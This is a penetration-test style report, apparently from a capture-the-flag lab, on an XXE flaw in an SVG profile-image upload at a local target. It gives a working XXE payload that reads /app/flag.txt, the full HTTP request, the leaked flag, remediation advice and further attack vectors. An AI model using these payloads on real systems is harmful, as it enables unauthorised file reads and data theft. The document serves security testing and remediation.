# Security Assessment Report: XXE via SVG Profile Image Upload

## TL;DR
- **Objective:** Exploit XML External Entity (XXE) vulnerability via malicious SVG file upload to extract the flag
- **Outcome:** ACHIEVED - Successful exploitation confirmed, flag extracted
- **Highest-impact finding:** Unrestricted XML external entity resolution in SVG file processing allows arbitrary file read ("/app/flag.txt")
- **Validation status:** Confirmed - Flag `FLAG{c09fa0c9738d281e95d7623b48394b080e205d8862bbde171b3ef99294c4cdf3}` extracted via XXE payload execution

---

## Target Information
- **Target:** 127.0.0.1:32981
- **Host / base URL:** http://127.0.0.1:32981
- **Application or component:** Profile image upload system
- **Authentication context:** Not observed (endpoint appears accessible without authentication)
- **Relevant technology details:**
  - Accepts SVG format for profile images
  - Processes XML without external entity restrictions
  - Multipart/form-data upload handling

---

## Confirmed Vulnerability

### XXE (XML External Entity) via SVG Upload
- **Affected endpoint / component:** `POST /` (profile form submission)
- **Impact:** Critical - Arbitrary file read on server filesystem, information disclosure
- **Preconditions:** 
  - Application accepts SVG file uploads
  - XML parser processes external entities without restriction
  - Target file `/app/flag.txt` exists and is readable by the application process
- **Exact payload or PoC:**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="10" y="20">&xxe;</text>
  </svg>
  ```

---

## Steps to Reproduce

1. **Prepare the malicious SVG payload** with external entity declaration:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
   <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
     <text x="10" y="20">&xxe;</text>
   </svg>
   ```

2. **Submit the profile form** via `POST /` with multipart/form-data containing:
   - `name`: [any value]
   - `surname`: [any value]
   - `address`: [any value]
   - `image`: The malicious SVG file (as file upload)

3. **Analyze the response** - The server processes the SVG and resolves the `&xxe;` entity reference, embedding the contents of `/app/flag.txt` directly into the response HTML within the SVG `<text>` element.

---

## Validation / Evidence

- **Validation token / flag:** 
  ```
  FLAG{c09fa0c9738d281e95d7623b48394b080e205d8862bbde171b3ef99294c4cdf3}
  ```

- **Tool evidence:** 
  - Python interpreter used to craft and upload malicious SVG
  - Response analysis confirmed entity resolution

- **Request evidence:**
  ```
  POST / HTTP/1.1
  Host: 127.0.0.1:32981
  Content-Type: multipart/form-data; boundary=[boundary]
  
  --[boundary]
  Content-Disposition: form-data; name="name"
  
  [value]
  --[boundary]
  Content-Disposition: form-data; name="surname"
  
  [value]
  --[boundary]
  Content-Disposition: form-data; name="address"
  
  [value]
  --[boundary]
  Content-Disposition: form-data; name="image"; filename="payload.svg"
  Content-Type: image/svg+xml
  
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="10" y="20">&xxe;</text>
  </svg>
  --[boundary]--
  ```

- **Response evidence:**
  ```html
  <!DOCTYPE html><html lang="en"><head>...
  <div><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="10" y="20">FLAG{c09fa0c9738d281e95d7623b48394b080e205d8862bbde171b3ef99294c4cdf3}</text>
  </svg></div>
  ...
  ```

- **Notes on reliability / limitations:**
  - Exploitation is 100% reliable - entity resolution occurs consistently
  - No encoding bypasses required - straightforward XXE payload accepted
  - Response status 200 confirms successful upload and processing
  - Entity reference `&xxe;` was replaced with actual file content in output, confirming server-side XML parsing with external entity resolution

---

## Remediation

- **Root cause:** The application's XML parser processes SVG uploads without disabling external entity resolution. The `DOCTYPE` declaration and `ENTITY` definitions are processed, allowing the server to fetch and embed arbitrary file contents.

- **Recommended fix:**
  1. **Disable external entities** in the XML parser configuration:
     - Set `external_general_entities` to `False`
     - Set `external_parameter_entities` to `False`
     - Disable `load_external_dtd`
  2. **Use secure XML parsing libraries** that disable XXE by default (e.g., Python's `defusedxml`)
  3. **Implement input validation** - sanitize or reject SVG files containing `DOCTYPE` declarations
  4. **Consider converting SVG to raster formats** (PNG/JPEG) server-side to strip malicious XML content

- **Defense-in-depth:**
  - Implement Content Security Policy (CSP) headers
  - Run application with minimal file system privileges (principle of least privilege)
  - Place sensitive files outside web root and restrict application read access
  - Implement file upload restrictions (file type whitelisting, not just extension checking)

---

## How to Verify the Fix

1. **Retest with the original XXE payload:**
   - Submit the same malicious SVG containing `<!ENTITY xxe SYSTEM "file:///app/flag.txt">`
   - Observe the response

2. **Expected secure result:**
   - The server should either:
     - Reject the upload entirely due to DOCTYPE/ENTITY detection
     - Process the SVG without resolving external entities (the `&xxe;` reference remains literal or is stripped)
   - The flag content should NOT appear in the response
   - The SVG output should show empty text or literal `&xxe;` string instead of file contents

3. **Additional verification:**
   - Attempt other XXE vectors (parameter entities, different protocols like `php://filter`, `expect://`)
   - Verify error messages do not leak file existence or content information
   - Confirm SVG rendering still functions correctly for legitimate uploads

---

## Remaining Leads

- **Confirmed blockers:** None - exploitation was successful

- **Unverified leads:** 
  - Potential for SSRF via other protocols (http://, ftp://, etc.) in entity declarations
  - Possibility of denial-of-service via billion laughs or quadratic blowup attacks
  - Potential for extending to other file types if XML processing is used elsewhere

- **Missing context:**
  - Exact XML parser library and version in use
  - Full server-side file system structure and other readable sensitive files
  - Whether authentication is required for the upload endpoint in production
  - Content Security Policy and other security headers in place
